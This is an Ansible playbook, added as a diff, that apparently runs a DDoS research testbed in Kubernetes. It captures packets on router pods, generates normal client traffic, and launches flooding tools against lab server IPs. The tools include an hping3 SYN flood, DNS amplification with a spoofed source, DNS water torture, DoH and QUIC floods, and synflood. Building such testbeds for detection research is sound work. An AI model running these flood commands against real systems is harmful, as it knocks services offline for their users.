@@ -1,0 +1,204 @@
+---
+- name: Execute task in pods
+  hosts: localhost
+  gather_facts: no
+  vars:
+    cgclients: []
+    ddosclients: []
+
+  tasks:
+#--------------------------------------Configuration------------------------------------------------------------------------------------
+    - name: Include client counts
+      include_vars:
+        file: clients_number.yaml
+  
+    - name: Crear cgclients
+      set_fact:
+        cgclients: "{{ cgclients + [{'name': 'cgclient' ~ item, 'pod': 'cgclient' ~ item}] }}"
+      loop: "{{ range(1, cg_count + 1)|list }}"
+    
+    - name: Crear ddosclients
+      set_fact:
+        ddosclients: "{{ ddosclients + [{'name': 'ddosclient' ~ item, 'pod': 'ddosclient' ~ item}] }}"
+      loop: "{{ range(1, ddos_count + 1)|list }}"
+    
+    - name: Include server IPs
+      include_vars:
+        file: "{{ playbook_dir }}/server_ips.yaml"
+
+    - name: Debug loaded server IPs
+      debug:
+        var: ddosserver_ip
+
+    - name: Debug loaded server IPs
+      debug:
+        var: cgserver_ip
+
+
+#-----------------------------TCPDUMPS-------------------------------------------------------------------------------------------------
+
+    - name: Start dumps
+      shell: kubectl exec -n ddos {{ item.pod }} -- tcpdump -i {{ item.interface }} -w /home/{{ item.pod }}_{{ item.interface }}.pcap
+      loop:
+        - { pod: "ceos1", interface: "eth4" }
+        - { pod: "ceos1", interface: "eth1" }
+        - { pod: "ceos1", interface: "eth2" }
+        - { pod: "ceos1", interface: "eth3" }
+        - { pod: "ceos1", interface: "eth5" }
+        - { pod: "ceos1", interface: "eth6" }
+        - { pod: "ceos1", interface: "eth7" }
+        - { pod: "ceos2", interface: "eth4" }
+        - { pod: "ceos2", interface: "eth1" }
+        - { pod: "ceos2", interface: "eth2" }
+        - { pod: "ceos2", interface: "eth3" }
+        - { pod: "ceos3", interface: "eth4" }
+        - { pod: "ceos3", interface: "eth1" }
+        - { pod: "ceos3", interface: "eth2" }
+        - { pod: "ceos3", interface: "eth3" }
+        - { pod: "ceos4", interface: "eth4" }
+        - { pod: "ceos4", interface: "eth1" }
+        - { pod: "ceos4", interface: "eth2" }
+        - { pod: "ceos4", interface: "eth3" }
+      async: 3600
+      poll: 0
+
+
+#---------------------------------Tasks execution---------------------------------------------------------------------------------------
+    # #cgserver:
+    # - name: Start ACROSSserver.py
+    #   shell: kubectl exec -n ddos cgserver -- python3 ACROSSserver.py 
+    #   async: 3600
+    #   poll: 0
+    
+    # - name: Start ssh
+    #   shell: kubectl exec -n ddos cgserver -- /usr/sbin/sshd -D
+    #   async: 3600
+    #   poll: 0
+
+    
+    # #ddosserver:
+    # - name: Start bind9
+    #   shell: kubectl exec -n ddos ddosserver -- service named start
+
+    # - name: Start dnsdist
+    #   shell: kubectl exec -n ddos ddosserver -- service dnsdist start
+
+    # - name: Start caddy
+    #   shell: kubectl exec -n ddos ddosserver -- caddy run --config /etc/caddy/Caddyfile
+    #   async: 3600
+    #   poll: 0
+
+
+    #Cglient:
+    - name: Execute ACROSSfile_transfer
+      shell: kubectl exec -n ddos {{ item.pod }} -- python3 ACROSSfile_transfer.py https://ia800301.us.archive.org/21/items/ThePhantomoftheOpera/Phantom_of_the_Opera_512kb.mp4 #set url
+      loop: "{{ cgclients }}"
+      async: 3600 
+      poll: 0
+    
+    - name: Execute ACROSSfile_transfer_scp
+      shell: kubectl exec -n ddos {{ item.pod }} -- env cgserver={{ cgserver_ip }} python3 ACROSSfile_transfer_scp.py
+      loop: "{{ cgclients }}"
+      async: 3600 
+      poll: 0
+
+    - name: Execute ACROSSconsuming_video.py
+      shell: kubectl exec -n ddos {{ item.pod }} -- python3 ACROSSconsuming_video.py https://www.youtube.com/watch?v=-No-226O0tg 1800 #set time and url
+      loop: "{{ cgclients }}"
+      async: 3600 
+      poll: 0
+      register: acrossclient_result
+    
+    - name: Execute ACROSSshorts.py
+      shell: kubectl exec -n ddos {{ item.pod }} -- python3 ACROSSshorts.py 1800 #set time
+      loop: "{{ cgclients }}"
+      async: 3600 
+      poll: 0
+      register: acrossshorts_result
+
+    - name: Execute ACROSSrandom_walk
+      shell: kubectl exec -n ddos {{ item.pod }} -- python3 ACROSSrandom_walk.py 1800
+      loop: "{{ cgclients }}"
+      async: 3600 
+      poll: 0
+      register: acrossrandom_result
+      
+    - name: Execute ACROSSclient.py
+      shell: kubectl exec -n ddos {{ item.pod }} -- env cgserver={{ cgserver_ip }} python3 ACROSSclient.py 100000 #set multiplier
+      loop: "{{ cgclients }}"
+      async: 3600 
+      poll: 0
+      
+      
+    #ddosclient:
+    # - name: Start dnscrypt
+    #   shell: kubectl exec -n ddos {{ item.pod }} -- ./dnscrypt-proxy-linux_x86_64-2.1.5/config.sh
+    #   loop: "{{ ddosclients }}" 
+
+    - name: Execute hping3.sh
+      shell: kubectl exec -n ddos {{ item.pod }} -- env ddosserver={{ ddosserver_ip }} /bin/bash -c 'sudo hping3 -c 50 -d 100 -S $ddosserver -w 1232 -p 43 --flood'
+      loop: "{{ ddosclients }}"
+      async: 3600 
+      poll: 0
+
+    - name: Execute vegeta.sh
+      shell: kubectl exec -n ddos {{ item.pod }} -- env ddosserver={{ ddosserver_ip }} ./vegeta.sh 1800
+      loop: "{{ ddosclients }}"
+      async: 3600 
+      poll: 0
+
+    - name: Execute dns-amp
+      shell: kubectl exec -n ddos {{ item.pod }} -- env ddosserver={{ ddosserver_ip }} cgserver={{ cgserver_ip }} /bin/bash -c './dns_amp/dns-amp 10.0.24.1 -f domain.txt -t ANY -p 53 -s 10.0.25.1 -S -d 1800'
+      loop: "{{ ddosclients }}"
+      async: 3600 
+      poll: 0
+
+    - name: Execute floodoh.py
+      shell: kubectl exec -n ddos {{ item.pod }} -- python3 cne-DoH-master/floodoh.py 9999 www.example.com A https://micaddy.com/dns-query
+      loop: "{{ ddosclients }}"
+      async: 3600 
+      poll: 0
+
+    - name: Execute quic-flooding.sh
+      shell: kubectl exec -n ddos {{ item.pod }} -- /bin/bash -c './quic-flooding.sh'
+      loop: "{{ ddosclients }}"
+      async: 3600 
+      poll: 0
+
+    - name: Execute watertorture
+      shell: kubectl exec -n ddos {{ item.pod }} -- env ddosserver={{ ddosserver_ip }} cgserver={{ cgserver_ip }} /bin/bash -c './dns-flood/dnsflood example.com $ddosserver -s $cgserver -p 53 -R -S -d 1800'
+      loop: "{{ ddosclients }}"
+      async: 3600 
+      poll: 0
+
+    - name: Execute synflood
+      shell: kubectl exec -n ddos ddosclient7 -- env ddosserver={{ ddosserver_ip }} /bin/bash -c './synflood-master/build/bin/synflood $ddosserver 80 -i eth1'
+      loop: "{{ ddosclients }}"
+      async: 3600 
+      poll: 0
+
+      
+
+    # - name: Execute dns_scapy
+    #   shell: kubectl exec -n ddos {{ item.pod }} -- env ddosserver={{ ddosserver_ip }} python3 dns_scapy.py 100
+    #   loop: "{{ ddosclients }}"
+    #   async: 3600 
+    #   poll: 0
+    
+    # - name: Execute quick_scapy
+    #   shell: kubectl exec -n ddos {{ item.pod }} -- python3 quic-scapy/scapy_demo.py
+    #   loop: "{{ ddosclients }}"
+    #   async: 3600 
+    #   poll: 0
+
+
+#---------------------------------Waiting tasks---------------------------------------------------------------------------------------
+
+    - name: Waiting tasks
+      async_status: 
+        jid: "{{ item.ansible_job_id }}"
+      loop: "{{ (acrossclient_result.results | default([])) + (acrossshorts_result.results | default([])) + (acrossrandom_result.results | default([])) }}"
+      register: acrossclient_jobs
+      until: acrossclient_jobs.finished 
+      retries: 999
+      delay: 15
